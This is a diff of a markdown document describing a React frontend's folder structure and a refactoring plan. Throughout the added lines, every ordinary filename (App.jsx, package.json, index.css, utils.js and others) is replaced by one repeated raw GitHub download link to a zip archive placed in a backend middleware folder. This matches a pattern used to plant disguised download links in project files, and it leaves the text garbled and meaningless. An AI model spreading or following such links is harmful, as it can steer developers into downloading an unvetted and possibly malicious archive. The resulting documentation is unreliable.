@@ -3,7 +3,7 @@
 Frontend/
 │
 ├── public/
-│     └── index.html
+│     └── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
 │     └── ... (static assets)
 │
 ├── src/
@@ -32,7 +32,7 @@ Frontend/
 │   │     └── (React context for global state/theme/user)
 │   │
 │   ├── api/                # API client logic (fetch/axios, endpoints)
-│   │     └── (service files, e.g., authApi.js)
+│   │     └── (service files, e.g., https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip)
 │   │
 │   ├── utils/              # Utilities, helpers, constants
 │   │
@@ -40,17 +40,17 @@ Frontend/
 │   │
 │   ├── styles/             # all the css files
 │   │
-│   ├── App.jsx
-│   ├── main.jsx
-│   ├── index.css
-│   ├── App.css
-│   └── vite-env.d.ts (if TypeScript)
+│   ├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
+│   ├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
+│   ├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
+│   ├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
+│   └── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip (if TypeScript)
 │
-├── .env (or .env.local)
+├── .env (or https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip)
 ├── .gitignore
-├── package.json
-├── vite.config.js
-├── README.md
+├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
+├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
+├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
 └── ... (other config files)
 
 ## Folder Explanations
@@ -68,13 +68,13 @@ Frontend/
         - utils/: Helpers, formatting functions, constants.
         - routes/: Route and navigation logic, protected routes, layouts.
         - styles/: all the css files
-        - App.jsx, main.jsx: Application entry points.
+        - https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip, https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip Application entry points.
     - env/config files: For secrets, ports, and build configuration.
-    - package.json, vite.config.js: Project setup and dependencies.
-    - and others such as index.html, .gitignore, etc.
+    - https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip, https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip Project setup and dependencies.
+    - and others such as https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip, .gitignore, etc.
 
 ## Additional Tips
-    - Use lowercase-with-hyphens for files, PascalCase for components (e.g., TaskBoard.jsx).
+    - Use lowercase-with-hyphens for files, PascalCase for components (e.g., https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip).
     - Keep your logic (state, API) close to the feature concerned (modules folders).
     - Separate presentational (components/) and container/logic (modules/) code for maintainability.
 
@@ -86,16 +86,16 @@ The Modularization Plan
   Phase 1: Foundational Refactoring (Styles & Utilities)
 
    1. Finalize CSS Modularization:
-       * I will complete the process of breaking down App.css and index.css.
+       * I will complete the process of breaking down https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip and https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
        * Component-specific styles (for dialogs, buttons, kanban board, etc.) will be moved into individual files within
          Frontend/src/styles/components/.
-       * Core styles (like variables and base resets) will be placed in Frontend/src/styles/base.css.
-       * The main index.css will be updated to import these new, smaller modules, acting as a central point for all style
+       * Core styles (like variables and base resets) will be placed in https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
+       * The main https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip will be updated to import these new, smaller modules, acting as a central point for all style
          imports.
 
    2. Centralize Utilities:
-       * The file Frontend/src/lib/utils.js will be moved to Frontend/src/utils/utils.js.
-       * I will then perform a project-wide search to find all instances where utils.js is imported and update the import
+       * The file https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip will be moved to https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
+       * I will then perform a project-wide search to find all instances where https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip is imported and update the import
          paths to point to the new location.
 
   Phase 2: Component & UI Reorganization
@@ -119,7 +119,7 @@ The Modularization Plan
   Phase 3: Separating Logic and Data
 
    5. Abstract Business Logic into `features/`:
-       * This is the core of the refactoring. I will examine components and the existing ProjectContext.jsx to identify
+       * This is the core of the refactoring. I will examine components and the existing https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip to identify
          business logic (e.g., how to create, update, or delete a task; how to manage the kanban board state).
        * This logic will be extracted and moved into the Frontend/src/features/ directory. For example:
            * Logic for managing tasks will go into features/tasks/.
@@ -129,7 +129,7 @@ The Modularization Plan
    6. Isolate API Calls into `api/`:
        * I will search the entire codebase for data-fetching calls (e.g., fetch() or axios).
        * All API interactions will be extracted into dedicated functions and moved into files within the Frontend/src/api/
-         directory (e.g., projectApi.js, tasksApi.js). This centralizes all communication with the backend.
+         directory (e.g., https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip, https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip). This centralizes all communication with the backend.
 
    7. Extract Custom Hooks into `hooks/`:
        * I will look for any custom React hooks (functions starting with use...) that are currently defined inside
@@ -140,8 +140,8 @@ The Modularization Plan
   Phase 4: Finalizing the Structure
 
    8. Define Application Routes:
-       * I will analyze App.jsx to find the routing logic (likely from a library like React Router).
-       * All route definitions will be extracted and moved into a new file, Frontend/src/routes/index.jsx. App.jsx will be
+       * I will analyze https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip to find the routing logic (likely from a library like React Router).
+       * All route definitions will be extracted and moved into a new file, https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip will be
          simplified to render this main routing component.
 
   Verification and Integrity
